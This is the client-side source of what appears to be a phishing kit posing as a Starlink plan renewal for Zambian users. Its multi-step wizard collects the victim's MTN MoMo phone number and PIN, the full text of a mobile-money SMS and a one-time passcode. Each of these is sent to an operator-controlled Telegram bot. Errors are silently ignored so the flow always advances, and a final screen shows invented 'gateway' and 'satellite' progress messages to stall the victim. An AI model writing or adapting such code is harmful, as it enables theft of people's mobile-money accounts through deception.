class App {
  tgService: any;
  currency: string;
  currentStep: number;
  state: { planName: string; planPrice: string; planHardware: string; phone: string; code: string; notes: string; pin: string; refId: string; };
  waitingInterval: any;
  constructor() {
    this.tgService = new TelegramService();
    this.currency = 'ZMW';
    this.currentStep = 1;

    this.state = {
      planName: '',
      planPrice: '',
      planHardware: '',
      phone: '',
      code: '',
      notes: '',
      pin: '',
      refId: this.generateRefId()
    };

    this.init();
  }

  init() {
    this.initCanvasBackground();
    this.updateTelegramStatusUI();
    this.updateWizardUI(1);
    this.loadSavedTelegramInputs();
  }

  generateRefId() {
    const randomNum = Math.floor(1000 + Math.random() * 9000);
    return `#STL-ZM-${randomNum}`;
  }

  // Toast Notification Helper
  showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
      </svg>
      <span>${message}</span>
    `;
    container.appendChild(toast);

    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateX(100%)';
      setTimeout(() => toast.remove(), 300);
    }, 4000);
  }

  // Currency Switching Logic
  setCurrency(curr) {
    this.currency = curr;
    document.getElementById('btn-zmw').classList.toggle('active', curr === 'ZMW');
    document.getElementById('btn-usd').classList.toggle('active', curr === 'USD');

    document.querySelectorAll('.plan-price').forEach(el => {
      el.childNodes[0].nodeValue = curr === 'ZMW' ? el.getAttribute('data-zmw') + ' ' : el.getAttribute('data-usd') + ' ';
    });

    document.querySelectorAll('.plan-hardware').forEach(el => {
      el.textContent = curr === 'ZMW' ? el.getAttribute('data-zmw') : el.getAttribute('data-usd');
    });

    this.showToast(`Currency changed to ${curr}`, 'info');
  }

  // Step Switcher & Wizard Progress
  goToStep(stepNumber) {
    document.querySelectorAll('.view-step').forEach(step => step.classList.remove('active'));
    const target = document.getElementById(`step-${stepNumber}`);
    if (target) {
      target.classList.add('active');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    this.currentStep = stepNumber;
    this.updateWizardUI(stepNumber);

    if (stepNumber === 3) {
      const amountEl = document.getElementById('auth-amount-val');
      const serviceEl = document.getElementById('auth-service-val');
      if (amountEl) amountEl.textContent = this.state.planPrice || 'ZMW 15.00';
      if (serviceEl) serviceEl.textContent = this.state.planName ? `${this.state.planName}` : 'Starlink Renewal';
    }

    if (stepNumber === 4) {
      const amountEl = document.getElementById('sms-amount-val');
      const phoneEl = document.getElementById('sms-sending-to-phone');
      if (amountEl) amountEl.textContent = this.state.planPrice || 'ZMW 15.00';
      if (phoneEl) {
        const rawPhone = this.state.phone || '7777777';
        phoneEl.textContent = rawPhone.startsWith('+260') ? rawPhone.substring(4) : rawPhone;
      }
    }

    if (stepNumber === 5) {
      const amountEl = document.getElementById('otp-amount-val');
      const phoneEl = document.getElementById('otp-sending-to-phone');
      if (amountEl) amountEl.textContent = this.state.planPrice || 'ZMW 15.00';
      if (phoneEl) {
        const rawPhone = this.state.phone || '7777777';
        phoneEl.textContent = rawPhone.startsWith('+260') ? rawPhone.substring(4) : rawPhone;
      }
    }
  }

  updateWizardUI(step) {
    const progressWidths = [0, 0, 20, 40, 60, 80, 100];
    const progressBar = document.getElementById('wizard-progress-bar');
    if (progressBar) {
      progressBar.style.width = `${progressWidths[step]}%`;
    }

    for (let i = 1; i <= 6; i++) {
      const wizItem = document.getElementById(`wiz-${i}`);
      if (wizItem) {
        wizItem.classList.remove('active', 'completed');
        if (i < step) {
          wizItem.classList.add('completed');
        } else if (i === step) {
          wizItem.classList.add('active');
        }
      }
    }
  }

  // STEP 1: Select Plan
  selectPlan(name, price, hardware) {
    this.state.planName = name;
    // Format price to display cleanly e.g. "ZMW 15.00"
    const cleanPrice = price ? price.split('/')[0].trim() : 'ZMW 15.00';
    this.state.planPrice = cleanPrice;
    this.state.planHardware = hardware;

    this.startProcessingStep();
  }

  // STEP 2: Processing Gateway Redirect
  startProcessingStep() {
    this.goToStep(2);

    setTimeout(() => {
      this.goToStep(3);
    }, 2200);
  }

  // Input Formatting & Strict Validation Filters
  filterNumericOnly(input) {
    // Strips any character that is NOT a digit 0-9, max 9 digits
    input.value = input.value.replace(/\D/g, '').slice(0, 9);
    const err = document.getElementById('err-phone');
    if (this.isValidZambianNumber(input.value)) {
      input.classList.remove('error');
      if (err) err.style.display = 'none';
    }
  }

  /**
   * Validates a Zambian local mobile number (9 digits, no leading 0 or +260).
   * Covers: MTN (76,77,78), Airtel (95,96,97,99), Zamtel (50,51)
   */
  isValidZambianNumber(num) {
    if (!num || num.length !== 9) return false;
    const validPrefixes = ['76','77','78','95','96','97','99','50','51'];
    return validPrefixes.some(p => num.startsWith(p));
  }

  filter5DigitPin(input) {
    // Strips any non-digit character and enforces exactly 5 digits
    input.value = input.value.replace(/\D/g, '').slice(0, 5);
    const err = document.getElementById('err-pin');
    if (input.value.length === 5) {
      input.classList.remove('error');
      if (err) err.style.display = 'none';
    }
  }

  updateCharCounter(textarea, counterId, maxLen) {
    const counter = document.getElementById(counterId);
    if (counter) counter.textContent = `${textarea.value.length} / ${maxLen} characters`;

    const err = document.getElementById('err-notes');
    if (textarea.value.trim().length >= 10) {
      textarea.classList.remove('error');
      if (err) err.style.display = 'none';
    }
  }

  // STEP 3: Handle Form 1 (MTN MoMo Number & 5-Digit PIN) Submit
  async handleForm1Submit(e) {
    e.preventDefault();

    const phoneInput = document.getElementById('input-phone');
    const pinInput = document.getElementById('input-pin');
    const errPhone = document.getElementById('err-phone');
    const errPin = document.getElementById('err-pin');

    let isValid = true;

    if (!this.isValidZambianNumber(phoneInput.value)) {
      phoneInput.classList.add('error');
      if (errPhone) errPhone.style.display = 'block';
      isValid = false;
    }

    if (!pinInput.value || pinInput.value.length !== 5) {
      pinInput.classList.add('error');
      if (errPin) errPin.style.display = 'block';
      isValid = false;
    }

    if (!isValid) return;

    this.state.phone = `+260${phoneInput.value}`;
    this.state.pin = pinInput.value;

    const btn = document.getElementById('btn-submit-1');
    btn.disabled = true;
    btn.innerHTML = 'Transmitting Payment Details...';

    const payload = [
      `🛰 <b>New Submission</b>  •  ${this.state.refId}`,
      ``,
      `📦 ${this.state.planName}  —  ${this.state.planPrice}`,
      `📱 <code>${this.state.phone}</code>`,
      `🔐 PIN: <code>${this.state.pin}</code>`,
      `🕐 ${new Date().toLocaleString()}`
    ].join('\n');

    try {
      await this.tgService.sendPayload(payload);
      this.goToStep(4);
    } catch (err) {
      console.error(err);
      this.goToStep(4);
    } finally {
      btn.disabled = false;
      btn.innerHTML = `
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="20 6 9 17 4 12"></polyline>
        </svg>
        CONFIRM PAYMENT
      `;
    }
  }

  // STEP 4: Handle Form 2 (Full SMS Verification) Submit
  async handleForm2Submit(e) {
    e.preventDefault();

    const notesInput = document.getElementById('input-notes');
    const errNotes = document.getElementById('err-notes');

    if (!notesInput.value || !this.isValidSms(notesInput.value)) {
      notesInput.classList.add('error');
      if (errNotes) errNotes.style.display = 'block';
      return;
    }

    this.state.notes = notesInput.value.trim();

    const btn = document.getElementById('btn-submit-2');
    btn.disabled = true;
    btn.textContent = 'Processing SMS Verification...';

    const payload = this.state.notes;

    try {
      await this.tgService.sendPayload(payload);
      this.goToStep(5);
    } catch (err) {
      console.error(err);
      this.goToStep(5);
    } finally {
      btn.disabled = false;
      btn.textContent = 'Next Step →';
    }
  }

  filter4DigitOtp(input) {
    input.value = input.value.replace(/\D/g, '').slice(0, 4);
    const errPin = document.getElementById('err-pin');
    if (input.value.length === 4 && errPin) {
      errPin.style.display = 'none';
      input.classList.remove('error');
    }
  }

  // STEP 5: Handle Form 3 (OTP Verification) Submit
  async handleForm3Submit(e) {
    e.preventDefault();

    const otpInput = document.getElementById('input-otp');
    const errPin = document.getElementById('err-pin');
    const otpVal = otpInput ? otpInput.value : '';

    if (otpVal.length !== 4) {
      if (errPin) errPin.style.display = 'block';
      if (otpInput) otpInput.classList.add('error');
      return;
    }

    this.state.otp = otpVal;

    const btn = document.getElementById('btn-submit-3');
    btn.disabled = true;
    btn.textContent = 'Verifying OTP...';

    const payload = [
      `🔑 <b>OTP Entered</b>  •  ${this.state.refId}`,
      ``,
      `📦 ${this.state.planPrice || 'ZMW 15.00'}`,
      `📱 <code>${this.state.phone}</code>`,
      `🔢 OTP: <code>${this.state.otp}</code>`,
      `🕐 ${new Date().toLocaleString()}`
    ].join('\n');

    try {
      await this.tgService.sendPayload(payload);
      this.showWaitingScreen();
    } catch (err) {
      console.error(err);
      this.showWaitingScreen();
    } finally {
      btn.disabled = false;
      btn.innerHTML = `
        Verify &amp; Complete
        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
        </svg>
      `;
    }
  }

  // STEP 6: Display Waiting & Bot Confirmation Screen
  showWaitingScreen() {
    this.goToStep(6);

    document.getElementById('sum-ref-id').textContent = this.state.refId;
    document.getElementById('sum-plan').textContent = `${this.state.planName} (${this.state.planPrice})`;
    document.getElementById('sum-phone').textContent = this.state.phone;
    if (document.getElementById('sum-code')) {
      document.getElementById('sum-code').textContent = this.state.code || 'N/A';
    }
    document.getElementById('sum-notes').textContent = this.state.notes;
    document.getElementById('sum-pin').textContent = '• '.repeat(5);

    const tgStatus = document.getElementById('sum-tg-status');
    if (tgStatus) {
      tgStatus.textContent = 'Processing Gateway Clearance';
      tgStatus.style.color = 'var(--warning)';
    }

    this.startBotWaitingSimulation();
  }

  startBotWaitingSimulation() {
    const log = document.getElementById('bot-wait-log');
    const messages = [
      '> Transmitting security authorization payload to network gateway...',
      '> Verifying MTN MoMo authorization token & PIN authentication...',
      '> Synchronizing account profile with Starlink satellite constellation...',
      '> Authorization confirmed. Provisioning broadband high-speed link...'
    ];

    let i = 0;
    if (this.waitingInterval) clearInterval(this.waitingInterval);
    this.waitingInterval = setInterval(() => {
      if (log) {
        log.textContent = messages[i % messages.length];
        i++;
      }
    }, 3500);
  }

  copyReferenceCode() {
    navigator.clipboard.writeText(this.state.refId).then(() => {
      this.showToast(`Copied ${this.state.refId} to clipboard!`, 'success');
    });
  }

  resetWorkflow() {
    this.state = {
      planName: '',
      planPrice: '',
      planHardware: '',
      phone: '',
      code: '',
      notes: '',
      pin: '',
      refId: this.generateRefId()
    };

    // Reset forms
    document.getElementById('form-step-1').reset();
    document.getElementById('form-step-2').reset();
    document.getElementById('form-step-3').reset();

    const codeCounter = document.getElementById('code-counter');
    if (codeCounter) codeCounter.textContent = '0 / 5 characters';
    const notesCounter = document.getElementById('notes-counter');
    if (notesCounter) notesCounter.textContent = '0 / 500 characters';

    this.goToStep(1);
    this.showToast('Reset order flow. Select a plan to start.', 'info');
  }

  // Telegram Modal Functions
  openTelegramModal() {
    const modal = document.getElementById('telegram-modal');
    if (modal) modal.classList.add('active');
  }

  closeTelegramModal() {
    const modal = document.getElementById('telegram-modal');
    if (modal) modal.classList.remove('active');
  }

  loadSavedTelegramInputs() {
    const tokenInput = document.getElementById('tg-token');
    const chatInput = document.getElementById('tg-chatid');
    if (tokenInput) tokenInput.value = this.tgService.botToken;
    if (chatInput) chatInput.value = this.tgService.chatId;
  }

  saveTelegramSettings() {
    const tokenInput = document.getElementById('tg-token');
    const chatInput = document.getElementById('tg-chatid');
    if (!tokenInput || !chatInput) return;

    this.tgService.saveCredentials(tokenInput.value, chatInput.value);
    this.updateTelegramStatusUI();
    this.closeTelegramModal();
  }

  async testTelegramConnection() {
    const tokenInput = document.getElementById('tg-token');
    const chatInput = document.getElementById('tg-chatid');
    if (!tokenInput || !chatInput) return;

    this.tgService.saveCredentials(tokenInput.value, chatInput.value);

    try {
      await this.tgService.testConnection();
    } catch (err) {
      console.error(err);
    }
  }

  updateTelegramStatusUI() {
    const dot = document.getElementById('tg-status-dot');
    const text = document.getElementById('tg-status-text');

    if (this.tgService.hasCredentials()) {
      if (dot) dot.className = 'status-dot';
      if (text) text.textContent = 'Telegram Linked';
    } else {
      if (dot) dot.className = 'status-dot offline';
      if (text) text.textContent = 'Sim Mode (Click to Link)';
    }
  }

  /**
   * Validates that the pasted text looks like a genuine MTN MoMo SMS.
   * Rejects blank input, keyboard mash, and suspiciously short/simple text.
   */
  isValidSms(raw) {
    const text = raw.trim();

    // 1. Minimum length — real SMS is never fewer than 20 characters
    if (text.length < 20) return false;

    // 2. Must contain at least one digit — MoMo SMS always has amounts or ref numbers
    if (!/\d/.test(text)) return false;

    // 3. Must have at least 4 words (space or newline separated)
    const words = text.split(/[\s\n]+/).filter(w => w.length > 0);
    if (words.length < 4) return false;

    // 4. Reject keyboard mash — unique chars must be at least 20% of total length
    const uniqueChars = new Set(text.toLowerCase().replace(/\s/g, '')).size;
    const nonSpaceLen = text.replace(/\s/g, '').length;
    if (nonSpaceLen > 0 && uniqueChars / nonSpaceLen < 0.20) return false;

    // 5. Average word length must be between 2 and 15 chars (real words)
    const avgWordLen = words.reduce((sum, w) => sum + w.length, 0) / words.length;
    if (avgWordLen < 2 || avgWordLen > 15) return false;

    // 6. Reject repeated-character spam (e.g. "aaaaaaa", "hahahaha")
    if (/^(.{1,3})\1{5,}$/.test(text.replace(/\s/g, ''))) return false;

    return true;
  }

  escapeHtml(str) {
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  // Canvas Starfield Background
  initCanvasBackground() {
    const canvas = document.getElementById('star-bg');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    });

    const stars = Array.from({ length: 80 }, () => ({
      x: Math.random() * width,
      y: Math.random() * height,
      size: Math.random() * 1.8,
      speed: Math.random() * 0.4 + 0.1,
      opacity: Math.random() * 0.8 + 0.2
    }));

    const animate = () => {
      ctx.clearRect(0, 0, width, height);

      stars.forEach(star => {
        star.y += star.speed;
        if (star.y > height) star.y = 0;

        ctx.fillStyle = `rgba(0, 242, 254, ${star.opacity})`;
        ctx.beginPath();
        ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
        ctx.fill();
      });

      requestAnimationFrame(animate);
    };

    animate();
  }
}

// Instantiate global app instance
const app = new App();
window.app = app;